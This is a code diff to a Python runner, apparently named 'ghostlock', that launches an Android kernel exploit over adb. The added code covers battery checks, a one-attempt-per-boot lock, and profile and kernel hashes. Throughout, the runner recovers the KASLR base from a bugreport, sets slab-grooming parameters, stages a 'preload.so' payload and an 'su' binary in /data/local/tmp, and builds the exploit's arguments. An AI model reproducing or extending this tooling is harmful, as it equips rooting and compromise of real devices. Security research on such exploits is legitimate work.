@@ -18,6 +18,7 @@ import shlex
 import signal
 import subprocess
 import sys
+import tempfile
 import threading
 import time
 from dataclasses import asdict, dataclass
@@ -33,6 +34,7 @@ DEFAULT_PAYLOAD_SHA256 = (
 DEFAULT_REMOTE_PAYLOAD = "/data/local/tmp/preload.so"
 DEFAULT_REMOTE_SU = "/data/local/tmp/su"
 FORBIDDEN_ADB_SUBCOMMANDS = frozenset(("root", "unroot"))
+ATTEMPT_PREFIX = "/data/local/tmp/.ghostlock-aipin-attempt."
 
 
 class RunnerError(RuntimeError):
@@ -105,6 +107,48 @@ class Adb:
 
 def shell_value(adb: Adb, command: str) -> str:
     return adb.shell(command).stdout.strip()
+
+
+def parse_battery(text: str) -> tuple[int | None, bool | None]:
+    level_match = re.search(r"(?m)^\s*level:\s*(\d+)\s*$", text)
+    level = int(level_match.group(1)) if level_match else None
+    if level is not None and not 0 <= level <= 100:
+        level = None
+    sources = re.findall(
+        r"(?mi)^\s*(?:AC|USB|Wireless) powered:\s*(true|false)\s*$", text
+    )
+    powered = any(item.lower() == "true" for item in sources) if sources else None
+    return level, powered
+
+
+def assert_power(adb: Adb, minimum: int) -> tuple[int | None, bool | None]:
+    level, powered = parse_battery(adb.shell("dumpsys battery").stdout)
+    if minimum == 0:
+        return level, powered
+    if level is None or powered is None:
+        raise RunnerError("battery or external-power state is unavailable")
+    if level < minimum:
+        raise RunnerError(f"battery is {level}%; at least {minimum}% is required")
+    if not powered:
+        raise RunnerError("external power is not connected")
+    return level, powered
+
+
+def claim_boot_attempt(adb: Adb, boot_id: str) -> str:
+    if re.fullmatch(r"[0-9a-fA-F-]{36}", boot_id) is None:
+        raise RunnerError(f"invalid boot ID for attempt claim: {boot_id!r}")
+    claim = ATTEMPT_PREFIX + boot_id + ".lock"
+    command = (
+        "observed=$(cat /proc/sys/kernel/random/boot_id) && "
+        f"[ \"$observed\" = {shlex.quote(boot_id)} ] && "
+        f"mkdir {shlex.quote(claim)}"
+    )
+    result = adb.shell(command, check=False)
+    if result.returncode != 0:
+        raise RunnerError(
+            "this kernel boot was already claimed or changed; reboot before retrying"
+        )
+    return claim
 
 
 def capture_state(adb: Adb, remote_payload: str) -> DeviceState:
@@ -359,6 +403,10 @@ def write_manifest(path: Path, manifest: dict[str, object]) -> None:
     temporary.replace(path)
 
 
+def default_output_dir(timestamp: str) -> Path:
+    return Path(tempfile.gettempdir()) / f"ghostlock-prod-equivalent-{timestamp}"
+
+
 def main(argv: list[str] | None = None) -> int:
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--serial", required=True)
@@ -366,6 +414,9 @@ def main(argv: list[str] | None = None) -> int:
     parser.add_argument("--expected-slot")
     parser.add_argument("--expected-kernel-substring")
     parser.add_argument("--expected-boot-id")
+    parser.add_argument("--profile-id", required=True)
+    parser.add_argument("--profile-sha256", required=True)
+    parser.add_argument("--kernel-image-sha256", required=True)
     parser.add_argument("--symbols", type=Path, required=True)
     parser.add_argument("--bugreport", type=Path)
     parser.add_argument("--bugreport-timeout", type=int, default=600)
@@ -377,6 +428,8 @@ def main(argv: list[str] | None = None) -> int:
     parser.add_argument("--mm-order", type=int, default=3)
     parser.add_argument("--mm-objects-per-slab", type=int, default=36)
     parser.add_argument("--mm-cpu-partial", type=int, default=13)
+    parser.add_argument("--min-battery", type=int, default=20)
+    parser.add_argument("--retain-bugreport", action="store_true")
     parser.add_argument("--timeout", type=int, default=3600)
     parser.add_argument("--output-dir", type=Path)
     parser.add_argument("--execute", action="store_true")
@@ -384,8 +437,16 @@ def main(argv: list[str] | None = None) -> int:
 
     if not re.fullmatch(r"[0-9a-fA-F]{64}", args.payload_sha256):
         parser.error("--payload-sha256 must be exactly 64 hexadecimal characters")
+    if not re.fullmatch(r"[0-9a-f]{64}", args.profile_sha256):
+        parser.error("--profile-sha256 must be 64 lowercase hexadecimal characters")
+    if not re.fullmatch(r"[0-9a-f]{64}", args.kernel_image_sha256):
+        parser.error(
+            "--kernel-image-sha256 must be 64 lowercase hexadecimal characters"
+        )
     if args.timeout < 60 or args.bugreport_timeout < 60:
         parser.error("timeouts must be at least 60 seconds")
+    if not 0 <= args.min_battery <= 100:
+        parser.error("--min-battery must be between 0 and 100")
     geometry = {
         "object_size": args.mm_object_size,
         "slab_size": args.mm_slab_size,
@@ -401,15 +462,16 @@ def main(argv: list[str] | None = None) -> int:
         parser.error("mm geometry does not fit in the declared slab order")
 
     timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
-    output_dir = args.output_dir or Path(
-        f"/private/tmp/ghostlock-prod-equivalent-{timestamp}"
-    )
+    output_dir = args.output_dir or default_output_dir(timestamp)
     output_dir.mkdir(parents=True, exist_ok=False)
     manifest_path = output_dir / "manifest.json"
     manifest: dict[str, object] = {
         "started_at": utc_now(),
         "mode": "execute" if args.execute else "preflight-only",
         "serial": args.serial,
+        "profile_id": args.profile_id,
+        "profile_sha256": args.profile_sha256,
+        "kernel_image_sha256": args.kernel_image_sha256,
         "symbols": str(args.symbols.resolve()),
         "symbols_sha256": sha256_file(args.symbols),
         "mm_geometry": geometry,
@@ -445,17 +507,21 @@ def main(argv: list[str] | None = None) -> int:
         manifest["bugreport"] = str(bugreport.resolve())
         manifest["bugreport_sha256"] = sha256_file(bugreport)
 
-        kaslr = parse_bugreport(
-            bugreport,
-            args.symbols,
-            # Retail dumpstate omits linuxBootId.  A bugreport captured by this
-            # runner is still boot-bound: capture_state() brackets dumpstate
-            # and assert_same_boot() checks boot ID, boot epoch and uptime
-            # before --execute can proceed.  Pre-existing bugreports retain the
-            # stronger in-report boot-ID requirement.
-            expected_boot_id=None if captured_in_this_run else initial.boot_id,
-            expected_serial=args.serial,
-            expected_fingerprint=args.expected_fingerprint,
+        try:
+            kaslr = parse_bugreport(
+                bugreport,
+                args.symbols,
+                # Retail dumpstate omits linuxBootId.  A bugreport captured by
+                # this runner remains bound by before/after state captures.
+                expected_boot_id=None if captured_in_this_run else initial.boot_id,
+                expected_serial=args.serial,
+                expected_fingerprint=args.expected_fingerprint,
+            )
+        finally:
+            if captured_in_this_run and not args.retain_bugreport:
+                bugreport.unlink(missing_ok=True)
+        manifest["bugreport_retained"] = bool(
+            not captured_in_this_run or args.retain_bugreport
         )
         manifest["bugreport_binding"] = (
             "synchronous-before-after-device-state"
@@ -492,6 +558,15 @@ def main(argv: list[str] | None = None) -> int:
             manifest["result"] = "preflight-only"
             write_manifest(manifest_path, manifest)
             return 0
+
+        battery_level, externally_powered = assert_power(adb, args.min_battery)
+        manifest["launch_power"] = {
+            "battery_level": battery_level,
+            "externally_powered": externally_powered,
+            "minimum": args.min_battery,
+        }
+        manifest["attempt_claim"] = claim_boot_attempt(adb, initial.boot_id)
+        write_manifest(manifest_path, manifest)
 
         exploit_argv = build_exploit_argv(
             kaslr.runtime_text_base,
